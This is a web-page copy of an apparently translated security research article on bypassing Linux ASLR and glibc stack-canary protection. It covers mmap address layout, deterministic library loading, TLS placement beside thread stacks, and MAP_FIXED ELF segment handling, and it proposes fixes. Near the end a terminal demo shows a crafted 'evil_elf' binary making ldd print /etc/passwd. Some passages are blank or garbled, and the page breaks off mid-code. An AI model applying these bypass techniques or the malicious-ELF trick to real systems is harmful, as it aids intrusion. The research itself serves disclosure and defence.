<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We go around ASLR for Linux in a new way</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The Linux kernel is widespread throughout the world, both on servers and on user machines, on mobile platforms (Android OS) and on various ‚Äúsmart‚Äù dev...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We go around ASLR for Linux in a new way</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/x2/ns/1k/x2ns1kbk0mxp8jcuf5cldug-ljk.jpeg"><br><p><br>  The Linux kernel is widespread throughout the world, both on servers and on user machines, on mobile platforms (Android OS) and on various ‚Äúsmart‚Äù devices.  During its existence in the Linux kernel, many different mechanisms for protecting against exploitation of vulnerabilities have appeared, which may exist both in the kernel itself and in user applications.  Such mechanisms are, in particular, ASLR and stack canary, counteracting the exploitation of vulnerabilities in applications. </p><a name="habracut"></a><br><p>  This paper describes the implementation of ASLR in the Linux kernel of the current version (4.15-rc1).  Problems have been discovered that allow partial or full circumvention of this protection.  Along with the description of the problems, a number of corrections are proposed.  A special utility has been developed and reviewed to demonstrate the problems found.  All problems are considered in the context of the x86-64 architecture, although for most of the architectures supported by the Linux kernel, they are also relevant. </p><br><p>  A number of important functions for the application work are implemented in user space, so during the analysis of the ASLR implementation mechanism, part of the GNU Libc library (glibc) was analyzed and serious problems with the implementation of stack canary were found.  It was possible to bypass the stack canary protection and run arbitrary code through the ldd utility. </p><br><p>  This paper discusses various ways to bypass the ASLR when running applications. </p><br><h2 id="1-aslr">  1. ASLR </h2><br><p>  ASLR (address space layout randomization) is a technology created to complicate the exploitation of a certain class of vulnerabilities, used in some modern operating systems.  The basic principle of this technology is to eliminate the known addresses of the process address space for an attacker.  In particular, the addresses required in order to: </p><br><ul><li>  transfer control to the executable code; </li><li>  build a chain of ROP gadgets (Return Oriented Programming (1)); </li><li>  read (rewrite) important values ‚Äã‚Äãin memory. </li></ul><br><p>  The technology was first implemented for Linux in 2005.  In Microsoft Windows and Mac OS, the implementation appeared in 2007.  A good description of the ASLR implementation in Linux is given in article (2). </p><br><p>  During the existence of the ASLR, various techniques have been created to circumvent this technology, among which the following types can be distinguished: </p><br><ul><li>  ‚ÄúAddress leaks‚Äù - some vulnerabilities allow an attacker to obtain the addresses needed for an attack, which allows you to bypass ASLR (3); </li><li>  relative addressing - some vulnerabilities allow an attacker to access data relative to a certain address, thereby bypassing ASLR (4); </li><li>  implementation weaknesses - some vulnerabilities allow an attacker to guess the necessary addresses due to the small entropy or properties of a specific ASLR implementation (5); </li><li>  side effects of the equipment - the features of the processor, allowing to bypass the ALSR (6). </li></ul><br><p>  It should be noted that ASLR implementations vary greatly in different operating systems and are evolving.  Recent changes related to the work of Offset2lib (7), presented in 2014.  It revealed the weaknesses of the implementation, allowing to bypass the ASLR due to the proximity of all the libraries to the image of the binary ELF file of the program.  As a solution, it was proposed to allocate the image of the ELF file of the application into a separate randomly selected region. </p><br><p>  In April 2016, the creators of Offset2lib also criticized the current implementation, highlighting the lack of entropy when choosing the address of the region in ASLR-NG (8).  However, since then the patch has not been published. </p><br><p>  Consider the result of the work of ASLR in Linux at the moment: </p><br><img src="https://habrastorage.org/webt/2o/hl/3x/2ohl3xfhvkiw4pfyyiplzw1dlnm.png"><br><h2>  2. ASLR in Linux </h2><br><p>  For the initial experience, take Ubuntu 16.04.3 LTS (GNU / Linux 4.10.0-40-generic x86_64) with the latest updates currently installed.  The result will not depend much on the Linux distribution and the kernel version starting from 3.18-rc7.  If you run "less / proc / self / maps" in the Linux command line, you can see something like the following. </p><br><p>  The example shows: </p><br><ul><li>  The base address of the binary application (in our case <i>/ bin / less</i> ) is chosen as <b>5627a82bf000</b> . </li><li>  The heap start address ( <i>heap</i> ) is chosen as <b>5627aa2d4000</b> , which is the end address of the binary application plus some random value, in our case equal to <b>1de7000</b> ( <b>5627aa2d4000‚Äì 5627a84ed000</b> ).  The address is aligned to 2 ^ 12 due to the architectural features of x86-64. </li><li>  Address <b>7f3631293000 is</b> chosen as mmap_base, this address will be as high as possible when choosing a ‚Äúrandom‚Äù address for any memory allocation using the mmap system call. </li><li>  The <i>ld-2.23.so, libtinfo.so.5.9, and libc-2.23.so libraries</i> are located in a row. </li></ul><br><p>  If you apply the subtraction to neighboring regions of memory, you can see: the difference between the binary file, the heap, the stack and the local-archive junior address, and the ld senior address is significant.  There is no free page between the loaded libraries (files). </p><br><p>  If you repeat the procedure many times, the picture will not change much: the difference between the pages will be different, but the libraries and files will be equally located relative to each other.  This fact became the reference point for this article. </p><br><h2>  3. Why is it so </h2><br><p>  Consider how the process of allocating virtual memory works.  All logic resides in the do_mmap kernel function, which implements memory allocation both from the user (syscall <i>mmap</i> ) and from the kernel (when <i>execve is</i> executed).  It is divided into two actions - first selecting the free appropriate address ( <i>get_unmapped_area</i> ), then displaying pages to the selected address ( <i>mmap_region</i> ).  We will be interested in the first stage. </p><br><p>  The choice of address options are possible: </p><br><ol><li>  If the <b>MAP_FIXED</b> flag is <b>set</b> , then the value of the <i>addr</i> argument will be returned as an address. </li><li>  If the value of the addr argument is nonzero, it is used as a ‚Äúhint‚Äù, and in some cases this value will be chosen. </li><li>  The address will be selected as the largest address of the free region, suitable in length and lying within the allowable range of selectable addresses. </li><li>  The address is checked for security restrictions (we will return to this later, section 7.3). </li></ol><br><p>  If everything went well, the required memory region will be allocated to the selected address. </p><br><h3>  Details of the address selection algorithm </h3><br><p>  The virtual memory manager of the process is based on the <i>vm_area_struct</i> structure (hereinafter simply vma): </p><br><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vm_area_struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> vm_start; <span class="hljs-comment"><span class="hljs-comment">/* Our start address within vm_mm. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> vm_end; <span class="hljs-comment"><span class="hljs-comment">/* The first byte after our end address within vm_mm. */</span></span> ... <span class="hljs-comment"><span class="hljs-comment">/* linked list of VM areas per task, sorted by address */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vm_area_struct</span></span></span><span class="hljs-class"> *</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vm_next</span></span></span><span class="hljs-class">, *</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vm_prev</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">rb_node</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">vm_rb</span></span></span><span class="hljs-class">;</span></span> ... <span class="hljs-keyword"><span class="hljs-keyword">pgprot_t</span></span> vm_page_prot; <span class="hljs-comment"><span class="hljs-comment">/* Access permissions of this VMA. */</span></span> ... };</code> </pre> <br><p>  This structure describes the beginning of a region of virtual memory, the end of a region, and access flags to pages in a region. </p><br><p>  <i>vma are</i> organized in a doubly linked list (9) by increasing addresses of the beginning of the region.  And in the expanded red-ebony (10), also by increasing the addresses of the beginning of the region.  A good rationale for this decision is given by the core developers themselves (11). </p><br><p>  Example of a doubly linked list vma in ascending order of addresses: </p><br><img src="https://habrastorage.org/webt/-w/qi/rq/-wqirqsvfztirfb3i33sfflbl4s.png"><br><p>  An extension of a red-black tree is the amount of free memory for the node in question.  The amount of free memory of a node is defined as the maximum: </p><br><ul><li>  from the difference between the beginning of the current vma and the end of its predecessor in the doubly linked list in ascending order; </li><li>  free memory of the left subtree; </li><li>  free memory values ‚Äã‚Äãof the right subtree. </li></ul><br><p>  An example of an expanded red-black vma tree: </p><br><img src="https://habrastorage.org/webt/j_/8l/uw/j_8luwdvuulz6l1kxsymd7oesni.png"><br><p><br>  The selected structure allows you to quickly (beyond O (log n)) to find the vma corresponding to the desired address, or select a free range of a certain length. </p><br><p>  When choosing an address, two important limits are also entered - the lowest possible lower value and the highest possible upper one.  The lower one is defined by the architecture as the minimum allowed address or the minimum allowed by the system administrator.  The top one - <i>mmap_base</i> - is selected as <i>stack - random</i> , where <i>stack</i> is the selected maximum stack address, random is some random value with entropy from 28 to 32 bits depending on the corresponding kernel parameters.  The Linux kernel cannot select an address above <i>mmap_base</i> .  In the address space of the process, addresses larger than mmap_base either correspond to the stack and special system regions, <i>vvar</i> and <i>vdso</i> , or will never be used unless they are explicitly allocated with the <b>MMAP_FIXED</b> flag. </p><br><p>  In the whole scheme, the addresses of the beginning of the stack of the main thread, the base address of loading the binary file of the application, the starting address of the application heap and <i>mmap_base</i> , the starting address of memory allocation using <i>mmap, are unknown</i> . </p><br><h2>  4. Why is it bad </h2><br><p>  There are several problems that follow from the described memory allocation algorithm. </p><br><h3>  4.1 Close memory location </h3><br><p>  During operation, the application uses virtual RAM.  Common examples of how an application uses memory are heaps, code, and data (.rodata, .bss) of loaded modules, stacks of streams, and loaded files.  Any processing error in these pages may also affect nearby data.  The more heterogeneous pages are nearby, the greater the attack surface and the higher the probability of successful operation. </p><br><p>  Examples of such errors are errors with boundary processing (out-of-bounds (4)), overflows (integer (12) or buffers (13)), type processing errors (type confusion (14)). </p><br><p>  A particular case of this problem is a vulnerability to an offset2lib attack, described in (7).  In short: the problem was that the base load address of the program was not allocated separately from the libraries, but was chosen by the kernel as mmap_base.  In case of presence of a vulnerability in the application, operation was simplified by a close location of the images of the loaded libraries to the image of the loaded binary application. </p><br><p>  A very good example to demonstrate this problem was the vulnerability in PHP (15), which allows you to read or modify neighboring memory regions. </p><br><p>  Section 5 will present a few examples. </p><br><h3>  4.2 Deterministic Library Loading Method </h3><br><p>  Loading of dynamic libraries in the Linux OS almost completely occurs without reference to the Linux kernel.  The ld library (from GNU Libc) is responsible for this.  The only participation of the kernel is through the mmap function (we do not take into account the open / stat and other file operations): this is needed to load the library code and data into the process address space.  An exception is the ld library itself, which is usually written in the executable ELF file of the program as an interpreter for loading the file.  The interpreter itself is loaded by the kernel. </p><br><p>  So, if ld from GNU Libc is used as an interpreter, then libraries are loaded in the following way: </p><br><ol><li>  The ELF-file of the program is added to the queue of files being processed. </li><li>  The first ELF file (FIFO) is removed from the queue of files being processed. </li><li>  If the file has not yet been loaded into the address space of the process, it is loaded using mmap. </li><li>  Each required library for the file in question is added to the queue of files being processed. </li><li>  While the queue is non-empty, point 2 should be repeated. </li></ol><br><p>  It follows from this algorithm that the order of loading is always determined and can be repeated if all the necessary libraries (their binary files) are known.  This allows you to restore the addresses of all libraries, if you know the address of at least one of them: </p><br><ol><li>  Suppose the address of the libc library is known. </li><li>  Add the length of the libc library to the libc download address - and get the address of the library loaded up to libc. </li><li>  Continuing the calculations in this way, we obtain the values ‚Äã‚Äãof mmap_base and the addresses of libraries loaded before libc. </li><li>  Subtract from the libc address the length of the library loaded after libc.  Get the address of the library loaded after libc. </li><li>  Continuing the calculations in a similar way, we obtain the addresses of all the libraries loaded at program start using the ld interpreter. </li></ol><br><p>  If the library was loaded while the program was running (for example, using the dlopen function), its position relative to other libraries may be unknown to the attacker in some cases.  For example, if there were mmap calls with unknown sizes of allocated memory regions for an attacker. </p><br><p>  When exploiting vulnerabilities, knowledge of library addresses helps a lot, for example, in searching for ‚Äúgadgets‚Äù when building ROP chains.  In addition, any vulnerability in any of the libraries that allows reading (writing) values ‚Äã‚Äãrelative to the address of this library will be easily exploited due to the fact that the libraries follow each other. </p><br><p>  Most Linux distributions contain compiled packages with the most common libraries (for example, libc).  This gives knowledge of the length of the libraries when building a part of the distribution pattern of the virtual address space of the process in the case described above. </p><br><p>  Theoretically, you can build a large database, for example, for the Ubuntu distribution, which contains the versions of the ld, libc, libpthread, libm, etc. libraries, and for each version of one of the libraries you can determine the many versions of libraries needed for it (dependencies).  Thus, it is possible to construct possible variants of distribution maps of a part of the address space of a process with the known address of one of the libraries. </p><br><p>  Examples of such databases are <a href="http://libcdb.com/">libcdb.com</a> and <a href="http://libc.blukat.me/">libc.blukat.me</a> , which are used to determine libc versions by offsets to known functions. </p><br><p>  From the above, it follows that a deterministic library loading order is an application security problem, the value of which increases with the previously described mmap behavior.  On Android, this problem has been fixed since version 7 (16) (17). </p><br><h3>  4.3 Deterministic order of execution </h3><br><p>  Consider the following property of programs: there are a couple of certain points in the program execution flow, between which the program state in the data of interest is determined.  For example, when a client connects to a network service, the latter allocates some resources to the client.  Some of these resources can be allocated from the application heap.  In this case, the relative position of objects on the heap is determined in most cases. </p><br><p>  This property is used during application operation when building the required program state.  Let's call it a deterministic execution order. </p><br><p>  A particular case of this property is some specific point in the program execution flow, in which (point) from the beginning of the program execution, from launch to launch, its state is identical except for some variables.  For example, before executing the program‚Äôs <i>main</i> function, the ld interpreter must load and initialize all the libraries and initialize the program.  The arrangement of libraries relative to each other, as noted in section 4.2, will always be the same.  Differences at the time of the execution of the <i>main</i> function will be in the specific addresses of the program load, libraries, stack, heap and objects allocated to this moment in the memory.  Differences are due to randomization described in section 6. </p><br><p>  Thanks to this property, an attacker can get information about the relative position of the program data.  This location will not depend on the randomization of the process address space. </p><br><p>  The only possible entropy at this stage may be due to the competition of streams: if the program creates several streams, their competition when working with data can introduce entropy into the location of objects.  In this example, creating threads before performing <i>main is</i> possible from the global constructors of the program or the libraries it needs. <br>  When the program starts using the heap and allocating memory in it (usually with the help of new / malloc), the arrangement of objects in the heap relative to each other will also be constant for a certain moment for each launch. </p><br><p>  In some cases, the arrangement of the stacks of threads created and the heaps created for them will also be predictable with respect to the library addresses. </p><br><p>  If necessary, you can get these offsets to use during operation.  For example, by running ‚Äústrace -e mmap‚Äù for this application two times and comparing the difference in addresses. </p><br><h3>  4.4 Holes </h3><br><p>  If the application, after allocating memory through mmap, frees up some of it, there may be ‚Äúholes‚Äù - free memory regions surrounded by occupied regions.  Problems can arise if this memory (hole) is again allocated for a vulnerable object (an object that has some vulnerability in its processing).  This again leads to the problem of the proximity of objects in memory. </p><br><p>  A good example of creating such holes was found in the ELF file download code in the Linux kernel.  When loading an ELF file, the kernel first reads the full size of the file being loaded and tries to display the entire file using <i>do_mmap</i> .  After a successful file download, the entire memory after the first segment is freed.  All the following segments are loaded at a fixed address ( <b>MAP_FIXED</b> ) obtained relative to the first segment.  This is necessary in order to be able to load the entire file at the selected address and divide the segments by rights and offsets according to their descriptions in the ELF file.  This approach allows you to generate holes in memory, if they were defined in the ELF file between the segments. </p><br><p>  When an ELF file is loaded by the ld interpreter (GNU Libc) - in the same situation - it does not cause <i>unmap</i> , but changes permissions to free pages (holes) on <b>PROT_NONE</b> , thereby preventing any process access to these pages.  This approach is more secure. </p><br><p>  To fix the problem of loading an ELF file containing holes, a Linux kernel has proposed a patch that implements logic as in ld from the GNU Libc (see section 7.1). </p><br><h3>  4.5 TLS and thread stack <br></h3><br><p>  TLS (Thread Local Storage) is the mechanism by which each thread in a multi-threaded process can allocate storage locations (18).  The implementation of this mechanism is different for different architectures and operating systems, in our case, this is the implementation of glibc under x86-64.  For x86, the difference will be insignificant for the mmap problem in question. </p><br><p>  In the case of glibc, <i>mmap</i> is also used to create a TLS stream.  This means that the TLS stream is selected in the manner already described and can be changed in the case of close proximity to the vulnerable object. </p><br><p>  What is interesting about TLS?  In the glibc implementation, TLS is indicated by the <i>fs</i> segment register (for the x86-64 architecture).  Its structure describes the type <i><i>tcbhead_t</i></i> defined in the glibc source files: </p><br><pre> <code class="hljs cpp"><span class="hljs-keyword"><span class="hljs-keyword">typedef</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *tcb; <span class="hljs-comment"><span class="hljs-comment">/* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">dtv_t</span></span> *dtv; <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> *self; <span class="hljs-comment"><span class="hljs-comment">/* Pointer to the thread descriptor. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> multiple_threads; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> gscope_flag; <span class="hljs-keyword"><span class="hljs-keyword">uintptr_t</span></span> sysinfo; <span class="hljs-keyword"><span class="hljs-keyword">uintptr_t</span></span> stack_guard; <span class="hljs-keyword"><span class="hljs-keyword">uintptr_t</span></span> pointer_guard; ... } <span class="hljs-keyword"><span class="hljs-keyword">tcbhead_t</span></span>;</code> </pre> <br><p>  This type contains the <i>stack_guard</i> field, which stores the so-called ‚Äúcanary‚Äù - some random (or pseudo-random) number that allows you to protect the application from buffer overflows on the stack (19). </p><br><p>  The protection works as follows: when entering the function, a ‚Äúcanary‚Äù is placed on the stack, which is taken from <i>tcbhead_t.stack_guard</i> .  At the end of the function, the value on the stack is compared with the reference value in <i>tcbhead_t.stack_guard</i> , and if it does not match, the application will terminate with an error. </p><br><p>  The following workarounds are known: </p><br><ul><li>  if the attacker does not need to overwrite this value (20); </li><li>  if an attacker succeeds in reading or predicting this value, he will be able to successfully launch an attack (20); </li><li>  if the attacker can overwrite this value with the known value, he will also be able to successfully perform a buffer overflow attack on the stack (20); </li><li>  if the attacker can take control before the application is completed (21). </li></ul><br><p>  From the above it follows the importance of protecting TLS from being read or rewritten by an attacker. </p><br><p>  During this study, a problem was discovered in the TLS implementation of glibc for threads created with pthread_create.  For a new stream, you must select TLS.  after allocating stack memory, glibc initializes TLS in the higher addresses of this memory.  In the x86-64 architecture under consideration, the stack grows downwards, which means that TLS is at the top of the stack.  Pulling back a constant value from TLS, we get the value used by the new thread for the stack register.  The distance from TLS to the stack of the function passed in <i>pthread_create</i> is less than one page.  An attacker no longer has to guess or ‚Äúpry‚Äù the value of the ‚Äúcanary‚Äù; he can simply overwrite the reference value along with the value on the stack and bypass this protection completely.  A similar problem was found in Intel ME (22). </p><br><h3>  4.6 malloc and mmap </h3><br><p>  When using <i>malloc</i> in some cases, glibc uses <i>mmap</i> to allocate new memory locations ‚Äî if the size of the requested memory is larger than a certain amount.  In these cases, the memory will be allocated using <i>mmap</i> , which means that the address after the allocation will be ‚Äúnext‚Äù to the libraries or other data allocated by mmap.  In these cases, the attacker's attention is attracted by errors in handling objects on the heap, such as heap overflow, ‚Äúuse after free‚Äù (23) and ‚Äútype confusion‚Äù (14). </p><br><p>  The interesting behavior of the glibc library was noticed when using the <i>pthread_create</i> program.  The first time <i>malloc is</i> called from a thread created by <i>pthread_creaete</i> , glibc will call mmap to create a new heap for this thread.  In this case, all the addresses allocated with the help of <i>malloc</i> in this thread will be close to the stack of the same thread.  This case will be discussed in more detail in section 5.7. </p><br><p>  Some programs and libraries use <i>mmap</i> to map files to the process address space.  These files can be used, for example, as a cache or to quickly save (change) data on a disk. </p><br><p>  Abstract example: Let an application load an MP3 file using mmap.  The download address is called <i>mmap_mp3</i> .  Then it reads from the loaded data the offset before the beginning of the audio data <i>offset</i> .  Let the application present an error checking the length of the received value.  Then the attacker can prepare in a special way an MP3 file and gain access to the memory region located after <i>mmap_mp3</i> . </p><br><h3>  4.7 MAP_FIXED and Downloading ET_DYN ELF Files <br></h3><br><p>  The <b>mmap</b> manual for the <b>MAP_FIXED</b> flag says: </p><br><p>  <b>MAP_FIXED</b> <br>  Don't interpret addr as a hint: place the mapping at exactly that address.  add must must be multiple of the page size.  If the memory region is specified by addr and len <br>  overlaps pages of any existing mapping (s), then the overlapped part of the existing mapping (s) will be discarded.  f the specified address cant be used, mmap () <br>  will fail.  It is less portable. </p><br><p>  <b>In case the requested region with the MAP_FIXED flag overlaps the already existing regions, the result of successful execution of mmap will overwrite the existing regions.</b> </p><br><p>  Thus, if a programmer makes a mistake in working with <b>MAP_FIXED</b> , it is possible to override existing memory regions. </p><br><p>  An interesting example of such an error was found in the context of this work, both in the Linux kernel and in glibc. </p><br><p>  There is a requirement for ELF files, described in (24): segments of the ELF file should follow the Phdr header in ascending order of <i>vaddr</i> addresses: </p><br><p>  PT_LOAD <br>  The array element specifies a loadable segment, described by p_filesz and p_memsz.  The bytes from the memory are mapped to the beginning of the memory segment.  If the segment is the size of the pitch, the size of the pitch is the size of  The file size may not be larger than the memory size.  Loadable segment entries in the program header, sorted on the p_vaddr member. </p><br><p>  However, this requirement is not verified.  The current ELF file download code is as follows: </p><br><pre> <code class="hljs rust">case PT_LOAD: <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">loadcmd</span></span></span></span> *c = &amp;loadcmds[nloadcmds++]; c-&gt;mapstart = ALIGN_DOWN (ph-&gt;p_vaddr, GLRO(dl_pagesize)); c-&gt;mapend = ALIGN_UP (ph-&gt;p_vaddr + ph-&gt;p_filesz, GLRO(dl_pagesize)); ... maplength = loadcmds[nloadcmds - <span class="hljs-number"><span class="hljs-number">1</span></span>].allocend - loadcmds[<span class="hljs-number"><span class="hljs-number">0</span></span>].mapstart; ... <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">loadcmd</span></span></span></span> *c = loadcmds; c &lt; &amp;loadcmds[nloadcmds]; ++c) ... <span class="hljs-comment"><span class="hljs-comment">/* Map the segment contents from the file. */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (__glibc_unlikely (__mmap ((void *) (l-&gt;l_addr + c-&gt;mapstart), maplen, c-&gt;prot, MAP_FIXED|MAP_COPY|MAP_FILE, fd, c-&gt;mapoff)</code> </pre> <br><p>  The algorithm for processing all segments is as follows: </p><br><ol><li>  Calculate the size of the loaded ELF file - as the end address of the last segment minus the start address of the first segment. </li><li>  Allocate memory with <i>mmap</i> for the entire ELF file with the calculated size, thereby obtaining the base load address of the ELF file. </li><li>  In the case of glibc, change the permissions.  In the case of booting from the kernel, release the regions that form the holes.  At this point, the behavior of glibc and the Linux kernel is different, as described earlier in section 4.4. </li><li>  Allocate memory using <i>mmap</i> and the set <b>MAP_FIXED</b> flag for all remaining segments, using the address obtained when allocating the first segment, and adding to it the offset obtained from the ELF file header. </li></ol><br><p>      ELF-,           ‚Äî ,  ,    . </p><br><p>      ldd,        .    ld.      ELF-        ,  ldd: </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests/evil_elf</span></span>$ ldd ./main <span class="hljs-symbol"><span class="hljs-symbol">root:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">0</span></span><span class="hljs-symbol"><span class="hljs-symbol">:root</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/root</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin/bash</span></span> <span class="hljs-symbol"><span class="hljs-symbol">daemon:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-symbol"><span class="hljs-symbol">:daemon</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin/nologin</span></span> <span class="hljs-symbol"><span class="hljs-symbol">bin:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">2</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">2</span></span><span class="hljs-symbol"><span class="hljs-symbol">:bin</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin/nologin</span></span> <span class="hljs-symbol"><span class="hljs-symbol">sys:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">3</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">3</span></span><span class="hljs-symbol"><span class="hljs-symbol">:sys</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/dev</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin/nologin</span></span> <span class="hljs-symbol"><span class="hljs-symbol">sync:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">4</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">65534</span></span><span class="hljs-symbol"><span class="hljs-symbol">:sync</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/bin/sync</span></span> <span class="hljs-symbol"><span class="hljs-symbol">games:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">5</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">60</span></span><span class="hljs-symbol"><span class="hljs-symbol">:games</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/games</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin/nologin</span></span> <span class="hljs-symbol"><span class="hljs-symbol">man:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">6</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">12</span></span><span class="hljs-symbol"><span class="hljs-symbol">:man</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/var/cache/man</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin/nologin</span></span> <span class="hljs-symbol"><span class="hljs-symbol">lp:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">7</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">7</span></span><span class="hljs-symbol"><span class="hljs-symbol">:lp</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/var/spool/lpd</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin/nologin</span></span> <span class="hljs-symbol"><span class="hljs-symbol">mail:</span></span><span class="hljs-symbol"><span class="hljs-symbol">x:</span></span><span class="hljs-number"><span class="hljs-number">8</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">8</span></span><span class="hljs-symbol"><span class="hljs-symbol">:mail</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/var/mail</span></span><span class="hljs-symbol"><span class="hljs-symbol">:/usr/sbin/nologin</span></span> blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests/evil_elf</span></span>$</code> </pre> <br><p>       /etc/passwd.       : </p><br><pre> <code class="hljs ruby">blackzert@crasher<span class="hljs-symbol"><span class="hljs-symbol">:~/aslur/tests/evil_elf</span></span>$ ldd ./main linux-vdso.so.<span class="hljs-number"><span class="hljs-number">1</span></span> =&gt; (<span class="hljs-number"><span class="hljs-number">0x00007ffc48545000</span></span>) libevil.so =&gt; ./libevil.so (<span class="hljs-number"><span 